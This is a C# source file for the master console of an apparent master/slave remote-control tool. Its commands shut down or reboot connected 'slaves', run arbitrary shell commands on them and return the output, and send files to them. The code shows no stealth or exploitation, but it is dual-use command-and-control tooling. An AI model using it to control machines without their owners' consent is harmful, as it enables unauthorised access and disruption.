using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Master
{
    // Functions to send messages on client
    public class Commands
    {

        public static void OffCommand(string[] Args)
        {
            if (Args.Length > 1)
            {
                switch (Args[1])
                {
                    case "-r":
                        if(Args.Length >= 3)
                        {
                            switch (Args[2])
                            {
                                case "-s":
                                    if (Args.Length > 3)
                                    {
                                        if (!Check.ContainsLetters(Args[3]))
                                        {
                                            if (Status.ClientsConnected.Count > 0)
                                            {
                                                if (Status.CheckConnectedClient(Status.ClientsConnected[Converters.ParseValidNumber(Args[3])].Client))
                                                {
                                                    if (Connection.ClientMessage("<REBT>", Status.ClientsConnected[Converters.ParseValidNumber(Args[3])].Client).Contains("true"))
                                                    {
                                                        MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                MasterConsole.ConsoleMessage("Any slaves connected", CONSOLE_MSG.warning);

                                            }

                                        }
                                    }
                                    else
                                    {
                                        MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                                    }
                                    break;
                                default:
                                    MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                                    break;
                            }
                        }
                        else
                        {
                            if (Connection.ClientMessage("<REBT>", Status.CurrentClient.Client).Contains("true"))
                            {
                                MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                            }
                        }
                        break;
                    case "-s":
                        if(Args.Length > 2)
                        {
                            if (!Check.ContainsLetters(Args[2]))
                            {
                                if(Status.ClientsConnected.Count > 0)
                                {
                                    if (Status.CheckConnectedClient(Status.ClientsConnected[Converters.ParseValidNumber(Args[2])].Client))
                                    {
                                        if (Connection.ClientMessage("<OFF>", Status.ClientsConnected[Converters.ParseValidNumber(Args[2])].Client).Contains("true"))
                                        {
                                            MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                                        }
                                    }
                                }
                                else
                                {
                                    MasterConsole.ConsoleMessage("Any slaves connected", CONSOLE_MSG.warning);

                                }

                            }
                        }
                        else
                        {
                            MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                        }
                        break;
                    default:
                        MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                        break;
                }
            }
            else
            {
                if (Connection.ClientMessage("<OFF>", Status.CurrentClient.Client).Contains("true"))
                {
                    MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                }
            }

        }

        public static void ExitCommand(string[] Args)
        {
            // Contains arguments
            if (Args.Length > 1)
            {
                switch (Args[1])
                {
                    case "-h":
                        MasterConsole.ShowHelp(CONSOLE_HELP.exit);
                        break;
                    default:
                        MasterConsole.ConsoleMessage("Combination of arguments is wrong", CONSOLE_MSG.error);
                        break;
                }
            }
            else
            {
                MasterConsole.StopConsole();
            }
        }

        public static void SlavesCommand(string[] Args)
        {
            // Contains arguments
            if (Args.Length > 1)
            {
                switch (Args[1])
                {
                    case "-h":
                        MasterConsole.ShowHelp(CONSOLE_HELP.slaves);
                        break;
                    case "-c": // c of "Curretn"
                        if (Args.Length > 2)
                        {
                            if (Args[2] == "set")
                            {

                                int id = Converters.ParseValidNumber(Args[3]);
                                Slaves.SetCurrentSlave(id);
                            }
                            else
                            {
                                MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                            }
                        }
                        else
                        {
                            Slaves.PrintCurrentSlave();
                        }
                        break;
                    default:
                        MasterConsole.ConsoleMessage("Combination of arguments is wrong", CONSOLE_MSG.error);
                        break;
                }
            }
            else
            {
                Slaves.PrintSlaves();
            }
        }

        public static void ExecCommand(string[] Args, string cmd)
        {
            if (Args.Length > 1)
            {
                if (Args.Length >= 2)
                {
                    switch (Args[1])
                    {
                        case "-s": // s of "slave"
                            string command = Converters.TextBetween(cmd, "[", "]");
                            if (command != "")
                            {
                                string result = Connection.ClientMessage("<EXEC>" + command, Status.CurrentClient.Client);
                                if (result.Contains("<CMDOUT>"))
                                {
                                    Converters.CMDOutput(result);
                                }
                                else
                                {
                                    MasterConsole.ConsoleMessage("Not success", CONSOLE_MSG.error);
                                }
                            }
                            else
                            {
                                MasterConsole.ConsoleMessage("Invalid Argument", CONSOLE_MSG.error);
                            }

                            break;
                        default:
                            MasterConsole.ConsoleMessage("Invalid argument", CONSOLE_MSG.error);
                            break;
                    }
                }
                else
                {
                    string command = Converters.TextBetween(cmd, "[", "]");
                    string result = Connection.ClientMessage("<EXEC>" + command, Status.CurrentClient.Client);
                    if (result.Contains("<CMDOUT>"))
                    {
                        Converters.CMDOutput(result);
                    }
                    else
                    {
                        MasterConsole.ConsoleMessage("Not success", CONSOLE_MSG.error);
                    }
                }

            }
            else
            {
                MasterConsole.ConsoleMessage("Not found any command", CONSOLE_MSG.error);
            }
        }

        public static void FileCommand(string[] Args, string cmd)
        {
            if (Args.Length > 1)
            {
                string toSend = Converters.TextBetween(cmd, "[", "]");
                byte[] bytes = Auxiliars.GetFileBytes(toSend);
                Connection.SendFile(bytes, Status.CurrentClient.Client, toSend);
            }
            else
            {
                MasterConsole.ConsoleMessage("Invalid path", CONSOLE_MSG.error);
            }

        }
    }
}
